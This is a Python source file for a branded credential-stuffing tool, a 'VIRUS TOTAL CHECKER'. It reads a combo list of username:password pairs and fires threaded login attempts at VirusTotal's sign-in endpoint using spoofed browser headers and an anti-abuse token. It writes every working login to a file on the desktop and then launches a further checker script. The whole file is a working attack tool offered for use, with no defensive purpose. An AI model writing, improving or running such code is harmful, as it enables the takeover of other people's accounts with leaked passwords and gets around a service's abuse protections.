import tkinter as tk
from tkinter import filedialog
import requests
import os
from pathlib import Path
import time, shutil
import sys
import concurrent.futures
import signal
import json
from colorama import Fore, init
import requests,os,time,re,sys,concurrent.futures,signal,subprocess,json
from colorama import Fore , init
from pystyle import *

init()
os.system("cls")

ROBMO = "═══════ • 𝐑𝐎𝐁𝐌𝐎 𝐂𝐋𝐎𝐔𝐃 • ════════"

user = os.getlogin()
save_path = f"C:\\Users\\{user}\\Desktop\\URL's Tools\\Checker\\𝐆𝐎𝐎𝐃[𝐕.𝐓][𝐑𝐎𝐁𝐌𝐎 𝐂𝐋𝐎𝐔𝐃].txt"

passtracker = Path(f'C:/Users/{user}/Desktop/𝐏𝐚𝐬𝐬𝐓𝐫𝐚𝐜𝐤𝐞𝐫 ™')

if not passtracker.exists():
    passtracker.mkdir()

URLs_tools = passtracker / "URL's Tools"
if not URLs_tools.exists():
    URLs_tools.mkdir()

def center(text, color):
    terminal_width = shutil.get_terminal_size().columns
    for line in text.split('\n'):
        centered_text = line.center(terminal_width)
        sys.stdout.write(color + centered_text + Fore.RESET + '\n')

def Banner():
    os.system('cls' if os.name=='nt' else 'clear')
    banner_text = f"""{Fore.RED}



 /$$    /$$       /$$$$$$       /$$$$$$$        /$$   /$$        /$$$$$$  
| $$   | $$      |_  $$_/      | $$__  $$      | $$  | $$       /$$__  $$ 
| $$   | $$        | $$        | $$  \ $$      | $$  | $$      | $$  \__/ 
|  $$ / $$/        | $$        | $$$$$$$/      | $$  | $$      |  $$$$$$  
 \  $$ $$/         | $$        | $$__  $$      | $$  | $$       \____  $$ 
  \  $$$/          | $$        | $$  \ $$      | $$  | $$       /$$  \ $$ 
   \  $/          /$$$$$$      | $$  | $$      |  $$$$$$/      |  $$$$$$/ 
    \_/          |______/      |__/  |__/       \______/        \______/  
                                                                          
                                                                          
                                                                          
 /$$$$$$$$        /$$$$$$        /$$$$$$$$        /$$$$$$        /$$      
|__  $$__/       /$$__  $$      |__  $$__/       /$$__  $$      | $$      
   | $$         | $$  \ $$         | $$         | $$  \ $$      | $$      
   | $$         | $$  | $$         | $$         | $$$$$$$$      | $$      
   | $$         | $$  | $$         | $$         | $$__  $$      | $$      
   | $$         | $$  | $$         | $$         | $$  | $$      | $$      
   | $$         |  $$$$$$/         | $$         | $$  | $$      | $$$$$$$$
   |__/          \______/          |__/         |__/  |__/      |________/
                                                                          
                                                                        

"""

    os.system('cls' if os.name=='nt' else 'clear')
    center(banner_text, Fore.RED)
    Write.Print(f"\n\n     Select File:   ", Colors.red)

Banner()

def select_file():
    root = tk.Tk()
    root.withdraw()  

    file_path = filedialog.askopenfilename(title="Select Combo File", filetypes=[("Text Files", "*.txt")])
    if not file_path:
        os.system('cls' if os.name=='nt' else 'clear')
        Write.Print("\n\n     [•]  No file selected. Please select a file.", Colors.red_to_yellow)
        time.sleep(2)
        select_file()  
    else:
        file_name = os.path.basename(file_path)
        
        with open(file_path, "r", encoding="latin") as file:
            total_lines = len(file.readlines())
        os.system('cls' if os.name=='nt' else 'clear')
        Write.Print(f"\n\n     [•]  File: {file_name}", Colors.red_to_white)
        time.sleep(2)
        Write.Print(f"\n\n     [•]  Total Lines: {total_lines}", Colors.red_to_white)
        time.sleep(2)
        os.system('cls' if os.name == 'nt' else 'clear')
        Write.Print("\n\n     Updating.", Colors.red_to_white)
        os.system('cls' if os.name == 'nt' else 'clear')
        Write.Print("\n\n     Updating..", Colors.red_to_white)
        os.system('cls' if os.name == 'nt' else 'clear')
        Write.Print("\n\n     Updating...", Colors.red_to_white)
        time.sleep(2)
        os.system('cls' if os.name == 'nt' else 'clear')
        return file_path

def check_credentials(line):
    global good_count
    username, password = line.strip().split(":")
    data = {
        "data": {
            "user_id": username,
            "password": password,
            "forever": False
        }
    }
    headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br",
        "accept-ianguage": "en-US,en;q=0.9,es;q=0.8",
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json",
        "origin": "https://www.virustotal.com",
        "referer": "https://www.virustotal.com/",
        "sec-ch-ua": "\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Brave\";v=\"122\"",
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "x-app-version": "v1x31x2",
        "x-tool": "vt-ui-main",
        "x-vt-anti-abuse-header": "MTYzNjE5NDk5MzgtWkc5dWRDQmlaU0JsZG1scy0xNjI1ODY3ODY0LjU0OA=="
    }
    response = requests.post(url, headers=headers, data=json.dumps(data))
    response_data = response.json()

    if response.status_code == 200 and "Failure" not in response_data and "Incorrect user or password" not in response_data:
        Write.Print(f"\n\n     [+] Success: {username}:{password}", Colors.green)
        good_count += 1
        os.system(f"title VIRUS TOTAL CHECKER - Good: {good_count}")
        with open(save_path, "a", encoding="utf-8") as good_file:
            good_file.write(f"{username}:{password}\n")
            good_file.write(f"\n{ROBMO}\n\n")
    else:
        Write.Print(f"\n\n     [!] Failure: {username}:{password}", Colors.red)


def handle_interrupt(signal, frame):
    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')
    Write.Print("\n     [•]  Program has been stopped.", Colors.red_to_white)
    Write.Print("\n     [•]  Results saved.", Colors.red_to_white)
    time.sleep(3)
    sys.exit()

signal.signal(signal.SIGINT, handle_interrupt)
signal.signal(signal.SIGTERM, handle_interrupt)
file_path = select_file()
if not file_path:
    exit()

try:
    with open(file_path, "r", encoding="latin") as file:
        lines = file.readlines()
        good_count = 0
        bad_count = 0
        url = "https://www.virustotal.com/ui/signin"
        print("\n\n     Enter threads", Fore.RED)
        num_threads = int(input(Fore.BLUE + "\n\n     [-]: "))
        os.system("cls")

        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            executor.map(check_credentials, lines)

    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')
    

except FileNotFoundError:
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\n\n     [•]  File not found. Please select a valid file.", Fore.RED)
    time.sleep(3)
    sys.exit(2)

os.system('cls' if os.name == 'nt' else 'clear')
os.system('cd Checker && python Checker.py')